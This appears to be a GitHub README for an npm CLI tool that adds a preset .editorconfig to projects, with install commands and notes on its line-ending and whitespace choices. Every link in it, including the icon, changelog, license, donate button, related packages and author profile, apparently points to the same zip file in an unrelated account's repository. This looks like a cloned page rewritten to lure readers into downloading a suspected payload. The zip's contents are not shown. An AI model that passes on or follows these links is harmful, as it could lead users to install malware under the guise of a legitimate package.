<div align="center">
  <img src="https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip" alt="Icon of EditorConfig" width="256" height="256">
  <h1>EditorConfig</h1>
</div>

<blockquote align="center">EditorConfig • Instant Copy • Overwrite Prompt • Zero Dependencies</blockquote>

<h4 align="center">
  ✍🏼 A CLI tool for adding an opinionated EditorConfig to any project. 🐭
</h4>

<br>

## Table of Contents

- ✨ [**Features**](#features)
- 🕵🏼 [**Usage**](#usage)
- ⚙️ [**Implementation**](#implementation)
- 🎯 [**Motivation**](#motivation)
- 📝 [**Changelog**](#changelog)
- 🪪 [**License**](#license)
- 💖 [**Support**](#support)
- 🧬 [**Related**](#related)
- 👨🏻‍💻 [**Author**](#author)

<br>

## Features

- 🎨 Copies `.editorconfig` into the current project instantly
- ⚠️ Detects existing `.editorconfig` and prompts before overwriting
- ⏭️ Skips safely on declined overwrite - no `destructive` changes
- ✅ Clear success and error `feedback` for every outcome
- 🛡️ Zero dependencies - pure `Node.js` built-ins only

<br>

## Usage

Run it directly without installing:
```bash
npx @igorskyflyer/editorconfig
```

Or install globally:
```bash
pnpm add -g @igorskyflyer/editorconfig
npm i -g @igorskyflyer/editorconfig
yarn global add @igorskyflyer/editorconfig
```

Then run:
```bash
editorconfig
```

<br>

Adding `.editorconfig` to a fresh project:
```
✅ .editorconfig added to the project!
```

Running in a project that already has `.editorconfig`:
```
⚠️ .editorconfig already exists. Overwrite? (y/N)  
```

Accepting the overwrite:
```
✅ .editorconfig updated successfully!
```

Declining the overwrite:
```
⏭️  Skipped.
```

<br>

## Implementation

The CLI resolves two paths at runtime:

- **source** - the `.editorconfig` bundled inside the package
- **destination** - the current working directory (`process.cwd()`)

If no `.editorconfig` exists at the destination, it is copied instantly. If one already exists, an overwrite prompt is shown before any changes are made. All errors are caught and displayed with a non-zero exit code, ensuring shell scripts and CI pipelines can detect failures.

### Configuration Decisions

- **`end_of_line = lf`** - Unix line endings are the cross-platform standard for source code. Git, Linux, and macOS all default to `LF`, and most tooling (ESLint, Prettier, Biome) expects it.
- **`*.{bat,cmd,ps1} = crlf`** - Windows scripting formats require `CRLF`. The Windows script host and some parsers behave unexpectedly with `LF`-only line endings in these files.
- **`*.sh = lf`** - Shell scripts break on `CRLF`. The Unix shebang line (`#!/bin/bash`) must be `LF`-terminated or the interpreter fails to parse it.
- **`*.go = tab`** - `gofmt` enforces tabs. Fighting it is futile and breaks the whole Go toolchain.
- **`trim_trailing_whitespace = false` for `*.md`** - Markdown uses trailing spaces as intentional line breaks (`\n`). Trimming them silently breaks formatting.
- **`insert_final_newline = true`** - POSIX defines a text file as ending with a newline. Omitting it causes noisy diffs and warnings in many tools.
<br>

## Motivation

Manually copying `.editorconfig` across projects is repetitive and error-prone. A shared, versioned config ensures every project stays consistent - one update propagates everywhere, just like all packages of the `@igorskyflyer` ecosystem do!

<br>

## Changelog

Read about the latest changes in the [**CHANGELOG**](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip).

<br>

## License

Licensed under the [**MIT license**](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip).

<br>

## Support

<div align="center">
  Engineering and documenting open-source projects<br>
  involves a significant investment of time.
  <br><br>
  If this project or its implementation has provided value,<br>
  support is greatly appreciated.
  <br><br>
  <a href="https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip" target="_blank"><img src="https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip" alt="Donate to igorskyflyer" width="180" height="46"></a>
  <br><br>
  <em>Thank you for supporting these efforts!</em> 🙏😊
</div>

<br>

## Related

[**@igorskyflyer/valid-path**](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip)

> _🧰 Determines whether a given value can be a valid file/directory name. 🏜_

<br>

[**@igorskyflyer/windows-packages**](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip)

> _💻 A package for reading the Packages registry key on Windows 10+. Useful for retrieving Windows 10+ installed Store applications. 📦_

<br>

[**@igorskyflyer/astro-render-component**](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip)

> _🤖 Astro component renderer. Zero configuration. Produces clean HTML strings directly in Node.js without any DOM environment. 🐬_

<br>

[**@igorskyflyer/my-file-path**](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip)

> _🌟 A package that strongly types file paths! 🥊_

<br>

[**@igorskyflyer/common-types**](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip)

> _🔦 Provides frequently used types for your TypeScript projects. 🦄_

<br>

## Author
Created by **Igor Dimitrijević ([*@igorskyflyer*](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip))**.
